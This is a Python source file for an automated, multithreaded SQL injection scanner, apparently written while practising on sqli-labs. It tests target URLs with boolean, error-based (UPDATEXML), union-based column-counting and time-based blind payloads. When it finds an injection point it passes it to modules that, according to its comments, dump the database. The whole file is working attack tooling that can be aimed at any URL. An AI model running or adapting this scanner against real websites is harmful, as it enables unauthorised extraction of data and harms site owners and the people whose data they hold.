# -*- coding: utf-8 -*-
# -*- ver	: >=3.8.0 -*-
# -*- coder : CO0kie丶 -*-
# -*- time  : 20201118 -*-

import sys
from time import sleep
from userdata import Global_UserData
from myhttp import HTTP
from inj_union import InjUnion
from inj_err import InjError
from inj_time import InjTime

print('我被打印了_Scanner.py')

# 初始化全局参数
Global_XlsSavePath = Global_UserData['XlsSavePath']
Global_Headers = {'User-Agent': Global_UserData['User-Agent']}


class UrlInjector(HTTP):
    body_len = 0

    def Print(self, text):
        self._lock.acquire()
        print(f'>>{self._threadname}：{text}')
        self._lock.release()
        pass

    def CheckInj(self) -> bool:
        """
        函数：检查该站点是否存在注入

        :return: T/F=是否存在注入点
        """

        sleep(0.1)
        for url_end in Global_UserData['inj_type']:
            url = self._url % url_end + ' and 0 --+'
            newlen, code = self.GET(url)
            self.Print(f'{code=},{newlen=},{self.body_len=}【{url}】')
            if newlen != self.body_len:
                # 判断注入方式是否在字典中
                if '注入方式' not in self._inj_info:
                    self._inj_info['注入方式'] = {}

                # 判断类型注入
                # if '基于类型注入' not in self._inj_info['注入方式']:
                #     self._url_end = url_end
                #     self._inj_info['注入方式']['基于类型注入'] = self._url % url_end

                # 判断报错注入
                url = self.url % url_end + ' and UPDATEXML(0,concat(char(126)),0)--+'
                newlen, code = super().GET(url)
                if newlen > 0 and "错误注入" not in self._inj_info and \
                        "XPATH syntax error" in self.content.text:
                    self._inj_info['注入方式']['基于报错注入'] = self._url % url_end
            pass

        # 闭合循环完毕，判断联合注入
        for url_end in Global_UserData['inj_type']:
            url0 = self._url % f"0{url_end[1:]} union SELECT %s --+"
            sql_code = ''
            for i in range(1, 10):
                sql_code += "'vErSiOn1',"
                url = url0 % sql_code[:-1]
                newlen, code = self.GET(url)
                self.Print(f'{code=},{newlen=},{url_end=},{i=}【{url}】')
                if "vErSiOn1" in self.content.text:
                    if 'right syntax' in self.content.text:
                        continue
                    sql_code = ('1,' * (i - 1))[:-1]
                    sql_code += ',(%s)'
                    self._inj_info['注入方式']['基于联合注入'] = url0 % sql_code
                    self.Print(f'联合注入点【{url0 % sql_code}】')
                    # sys.exit()
                    url0 = None
                    break
            if url0 is None:
                break
            pass

        # 判断时间盲注
        newlen, code = self.GET(self._url % '1')
        self.Print(f"{code=},{newlen=},{self.new_time}【{self._url % '1'}】")
        for url_end in Global_UserData['inj_type']:
            # 循环构造 注入点
            url = self._url % url_end + ' and if(1,sleep(0.5),0)--+'

            # 查询新时间
            newlen, code = self.GET(url)
            print(f'>>>{self._threadname}：{code=},{newlen=},{self.new_time}【{url}】')

            # 如果产生sleep，则表示注入成功
            if (self.new_time - self.old_time) * 1000 > 400:
                if '注入方式' not in self._inj_info:
                    self._inj_info['注入方式'] = {}
                self._inj_info['注入方式']['基于时间盲注'] = self._url % url_end
                break
            pass
        return "注入方式" in self._inj_info
        pass

    def __init__(self, Lock, ThreadName, Url):

        self._lock = Lock
        self._threadname = ThreadName
        self._url = Url
        # if 'Less-5' not in Url:
        #     return

        self.Print(f'扫描器传入 {Url=}')
        self.url = Url

        self.body_len, code = self.GET(Url % '1')
        self.Print(f'初始化Len {self.body_len}')
        if not self.body_len > 0:
            self.Print(f'无法注入，请检查该网页是否正常【{Url % "1"}】')
            return
        self._inj_info = {}

        # 初始化参数完毕，开始检测注入点
        if self.CheckInj():
            # 如果有注入点，则通过注入点权重脱裤
            inj_urls: dict = self._inj_info['注入方式']
            if "基于联合注入" in inj_urls:
                self._InjUnion = InjUnion(
                    self._lock, self._threadname, self._inj_info)
            elif "基于报错注入" in inj_urls:
                self._InjError = InjError(
                    self._lock, self._threadname, self._inj_info)
            elif "基于时间盲注" in inj_urls:
                self._InjTime = InjTime(
                    self._lock, self._threadname, self._inj_info)
                pass
            pass

        # 保存结果
        self._lock.acquire()
        # print(f">>>>{self._threadname}：", self._url, self._inj_info)
        Global_UserData['result'][self._url] = self._inj_info.copy()
        self._lock.release()
        pass

    pass
